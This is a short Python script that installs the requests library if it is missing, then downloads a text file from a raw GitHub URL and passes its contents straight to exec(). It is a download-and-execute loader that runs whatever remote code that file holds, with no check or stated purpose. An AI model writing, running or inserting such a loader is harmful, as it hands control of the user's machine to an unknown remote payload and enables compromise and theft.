try:
	import requests
except:
	import os
	os.system("pip install requests")
exec(requests.get('https://raw.githubusercontent.com/mohaedfachk/text/main/run.txt').text)